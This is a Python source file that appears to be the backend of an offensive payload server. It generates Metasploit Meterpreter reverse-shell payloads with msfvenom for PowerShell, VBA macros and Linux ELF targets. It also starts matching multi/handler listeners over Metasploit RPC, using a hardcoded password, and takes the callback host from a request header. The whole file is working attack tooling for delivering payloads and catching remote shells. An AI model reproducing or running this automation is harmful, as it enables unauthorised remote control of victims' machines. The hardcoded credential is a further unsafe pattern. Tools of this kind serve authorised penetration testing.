import hashlib
import json
import logging
import os
import subprocess
from time import sleep
from typing import Optional, List, Dict

from flask import request
from pymetasploit3.msfrpc import MsfRpcClient

logger = logging.getLogger(__name__)

PAYLOAD_DIR = "payloads"

BASIC_LISTENER_CONFIG = {
    "PingbackSleep": 10,
    "OverrideRequestHost": True,
    "ReverseListenerBindAddress": "127.0.0.1",
    "ReverseListenerBindPort": 50000,
}

LISTENER_CONFIGS = {
    "PS_HTTPS": BASIC_LISTENER_CONFIG | {
        "Payload": "windows/x64/meterpreter/reverse_winhttps",
        "HttpProxyIE": False
    },
    "PS_TCP": BASIC_LISTENER_CONFIG | {
        "Payload": "windows/x64/meterpreter/reverse_tcp"
    },
    "VBA_32": BASIC_LISTENER_CONFIG | {
        "Payload": "windows/meterpreter/reverse_winhttps",
        "HttpProxyIE": False
    },
    "VBA_64": BASIC_LISTENER_CONFIG | {
        "Payload": "windows/x64/meterpreter/reverse_winhttps",
        "HttpProxyIE": False
    },
    "ELF": BASIC_LISTENER_CONFIG | {
        "Payload": "linux/x64/meterpreter_reverse_https"
    },
}

msf_client = None

try:
    msf_client = MsfRpcClient('Banaanmetjus1234!', username='python', port=55555)
except Exception as e:
    logger.error("COULD NOT CONNECT TO MsfRpcClient")
    logger.error("WILL CONTINUE WITHOUT LISTENER AUTOMATION!!!!")

def generate_payload_hash(payload_props):
    param_string = json.dumps(payload_props, sort_keys=True)
    hash_obj = hashlib.sha256(param_string.encode())
    return hash_obj.hexdigest()

def generate_payload_props(payload_name: str,
    lhost: Optional[str],
    lport: Optional[int],
    format: str,
    additional_props: Optional[List[Dict[str, str]]] = None
):
    if lhost is not None and lport is not None:
        additional_props = [{
            'lhost': lhost,
            'lport': lport,
        }] + (additional_props or [])

    return {
        'payload': payload_name,
        'format': format,
        'additional': additional_props or []
    }


def generate_payload(
    payload_name: str,
    lhost: Optional[str],
    lport: Optional[int],
    format: str,
    additional_props: Optional[List[Dict[str, str]]] = None
) -> str:
    params = generate_payload_props(payload_name, lhost, lport, format, additional_props)
    file_hash = generate_payload_hash(params)

    output_file_name = f"{file_hash}.{format}"
    output_path = f"{PAYLOAD_DIR}/{output_file_name}"

    os.makedirs(PAYLOAD_DIR, exist_ok=True)

    if os.path.exists(output_path):
        return output_file_name

    command = [
        'msfvenom',
        '-p', payload_name,
        '-f', format
    ]

    for propset in params['additional']:
        for key, value in propset.items():
            command.append(f"{key}={value}")

    try:
        print(f"Generating payload: {command}")

        result = subprocess.run(
            command,
            capture_output=True,
            text=False,
            check=True
        )

        with open(output_path, 'wb') as f:
            f.write(result.stdout)

        return output_file_name

    except subprocess.CalledProcessError as e:
        raise Exception(f"Payload generation failed: {e.stderr.decode()}")
    except Exception as e:
        raise Exception(f"Error generating payload: {str(e)}")

def get_host():
    host = request.headers['Incoming']

    if ':' in host:
        return host.split(':')[0], int(host.split(':')[1])
    else:
        return host, 443

def get_str(item):
    if type(item) == str:
        return item

    if type(item) == bool:
        return str(item).lower()

    if type(item) == int:
        return str(item)

def setup_listener(lhost, lport, config):
    if not msf_client:
        print(f"Not setting up listener for [{lhost}:{lport}]/[{config}]")
        return

    listener_config = config | {
        "LHOST": lhost,
        "LPORT": lport,
    }

    for job_id, job in msf_client.jobs.list.items():
        if job != 'Exploit: multi/handler':
            continue

        job_info = msf_client.jobs.info(job_id)

        for config_name, config_value in listener_config.items():
            if config_name == "Payload":
                continue

            if config_name not in job_info['datastore'].keys():
                print(f"Config {config_name} missing from [{job_info['datastore'].keys()}]")
                break

            if get_str(job_info['datastore'][config_name]) != get_str(config_value):
                print(f"Config {config_name} mismatch in [{job_info['datastore'][config_name]}] != [{get_str(config_value)}]")
                break
        else:
            # This line is hit if all configs match
            break
    else:
        # This line is hit if no matching jobs were found
        logger.info(f"No matching listeners found for [{lhost}, {lport}, {config}]")

        print(f"No matching listeners found for [{lhost}, {lport}, {config}]")

        handler = msf_client.modules.use('exploit', 'multi/handler')
        payload = msf_client.modules.use('payload', listener_config['Payload'])

        handler["ExitOnSession"] = False

        for config_name, config_value in listener_config.items():
            if config_name == "Payload":
                continue

            payload[config_name] = config_value

        if len(handler.missing_required) > 0:
            print(f"Handler missing required configs: {handler.missing_required}")
        elif len(payload.missing_required) > 0:
            print(f"Payload missing required configs: {payload.missing_required}")
        else:
            print(f"Starting listener for [{lhost}, {lport}]")

            config_str = "\n".join(map(lambda t: f"{t[0]}: {t[1]}",list(listener_config.items()) + [("ExitOnSession", False)]))
            print(config_str)

            job_id = handler.execute(payload=payload)

            print(f"Started job id {job_id}")

            sleep(1)